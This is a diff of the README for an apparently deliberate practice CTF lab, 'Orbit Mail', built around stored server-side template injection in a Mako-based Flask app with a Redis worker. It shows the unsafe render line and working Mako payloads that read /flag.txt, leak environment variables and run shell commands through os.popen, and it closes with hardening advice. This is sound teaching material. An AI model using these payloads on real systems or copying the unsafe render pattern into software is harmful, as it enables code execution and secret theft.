@@ -1,105 +1,118 @@
 # Orbit Mail Lab: Stored SSTI (Mako)
 
-CTF-jeopardy таск уровня `Easy/Medium` для практики **Server-Side Template Injection** на движке **Mako** (не Jinja2).
+CTF-jeopardy task (`Easy/Medium`) focused on **Server-Side Template Injection** using **Mako** (not Jinja2).
 
-## Легенда
+## Scenario
 
-Внутренний сервис `Orbit Mail` помогает маркетингу собирать email-кампании, запускать проверку рендера перед отправкой и смотреть операционные метрики.
+`Orbit Mail` is an internal marketing platform used to build email campaigns and run deliverability simulations.
 
-Игроку доступно несколько подсистем:
-- Campaigns (создание шаблонов)
-- Render Queue (очередь задач)
-- Tickets (служба поддержки)
-- Knowledge Base (внутренняя документация)
-- System Status (статусы компонентов)
+The app includes multiple modules to add realistic noise:
+- Campaigns
+- Render Queue
+- Tickets
+- Knowledge Base
+- System Status
 
-Ключевая уязвимость одна: **stored SSTI в модуле рендера кампаний**.
+There is one core vulnerability: **stored SSTI** in the campaign rendering flow.
 
-## Что внутри инфраструктуры
+## Architecture
 
-- `web` (Flask): UI + API + запись задач в очередь
-- `worker` (Python): отдельный процесс, который рендерит шаблоны
-- `redis`: очередь задач
-- `sqlite` (volume `app-data`): хранилище кампаний/задач/тикетов/KB
+- `web` (Flask): UI + API + queue producer
+- `worker` (Python): queue consumer + template rendering
+- `redis`: render job queue
+- `sqlite` (`app-data` volume): campaigns, jobs, tickets, KB
 
-Флаг доступен:
-- в env: `FLAG=practice{y3t_4n0th3r_sst1_9}`
-- в файле контейнера: `/flag.txt` со значением `practice{y3t_4n0th3r_sst1_9}`
-- в рабочей директории приложения: `/srv/app/flag.txt`
+Flag locations:
+- env: `FLAG=practice{y3t_4n0th3r_sst1_9}`
+- file: `/flag.txt`
+- app working directory file: `/srv/app/flag.txt`
 
-## Запуск
+## Run
 
 ```bash
-docker compose up --build
+docker compose up --build -d
 ```
 
-После старта:
-- UI: http://localhost:1337
-- API для PoC: `/api/campaigns`, `/api/campaigns/<id>/simulate`, `/api/jobs/<id>`
+After start:
+- UI: `http://localhost:1337`
+- API: `/api/campaigns`, `/api/campaigns/<id>/simulate`, `/api/jobs/<id>`
 
-Примечание: в `docker-compose.yml` используется `network_mode: host`, чтобы обойти проблемы `podman/netavark/nftables` в некоторых окружениях.
-Redis в этом режиме поднят на `127.0.0.1:6380`, чтобы не конфликтовать с локальным Redis на `6379`.
+Implementation note:
+- `docker-compose.yml` uses `network_mode: host` to avoid `podman/netavark/nftables` issues in some environments.
+- Redis listens on `127.0.0.1:6380` to avoid collisions with a local Redis on `6379`.
 
-## Где уязвимость
+## Vulnerability
 
-Уязвимый путь:
-1. Пользователь сохраняет `body_template` в кампанию.
-2. При запуске симуляции создаётся job в Redis.
-3. Worker читает job и делает небезопасный рендер:
+Flow:
+1. User submits `body_template` and it is stored in DB.
+2. User starts simulation, web service creates a render job in Redis.
+3. Worker reads the job and renders user-controlled template source unsafely.
+
+Vulnerable code path:
 
 ```python
 output = Template(campaign["body_template"]).render(**context)
 ```
 
-Это компилирует пользовательский ввод как Mako-шаблон и приводит к SSTI.
+Because user input is compiled and executed as Mako template code, this is stored SSTI.
 
-## Эксплуатация (ручной PoC)
+## Exploitation
 
-1. Создать кампанию с payload в шаблоне, например:
+### Manual
+
+Payload example (read flag file content):
 
 ```mako
 ${open('/flag.txt').read().strip()}
 ```
 
-2. Запустить `Start simulation` на странице кампании.
-3. Открыть страницу job (`/jobs/<id>`) и взять флаг из `Rendered output`.
-
-Альтернатива (env leak):
+Alternative (env leak):
 
 ```mako
 ${__import__('os').environ.get('FLAG')}
 ```
 
-## Автоматический PoC
+You can also confirm file presence first:
+
+```mako
+${__import__('os').popen('ls').read()}
+```
+
+Then read it:
+
+```mako
+${__import__('os').popen('cat flag.txt').read()}
+```
+
+### Automated PoC
 
 ```bash
 ./poc.py
-# или
+# or
 ./poc.py http://localhost:1337
 ```
 
-Ожидаемый результат:
-- создаётся кампания,
-- создаётся job,
-- job переходит в `done`,
-- выводится `practice{...}`.
+Expected result:
+- campaign is created,
+- simulation job is queued and completed,
+- output contains `practice{...}`.
 
-## Почему это Medium-
+## Why This Is Easy/Medium
 
-- Уязвимость stored (не одношаговый reflected preview).
-- Рендер вынесен в отдельный worker и очередь.
-- Вокруг есть дополнительные подсистемы (tickets/KB/status), которые создают реалистичный шум.
-- При этом логика эксплуатации остаётся прозрачной из-за подсказок и документации.
+- Stored SSTI (more realistic than reflected one-shot preview).
+- Separate worker + queue execution path.
+- Additional non-vulnerable modules increase analysis noise.
+- Exploit remains deterministic and straightforward.
 
-## Как чинить
+## Hardening
 
-1. Не компилировать пользовательский ввод как шаблон.
-2. Использовать фиксированные шаблоны на сервере и подставлять только данные.
-3. Если шаблоны от пользователя необходимы — использовать безопасный движок/песочницу с жёсткими ограничениями.
-4. Изолировать worker (минимальные права, read-only FS, без доступа к секретам).
-5. Не хранить флаги/секреты в доступном окружении процесса рендера.
+1. Never compile/render user input as template source.
+2. Use trusted static templates and pass user data as variables only.
+3. If user-authored templates are required, use strict sandboxing.
+4. Isolate worker runtime (least privileges, restricted FS, secret separation).
+5. Keep secrets/flags out of renderer process environment.
 
-## Структура
+## Project Layout
 
 ```text
 .
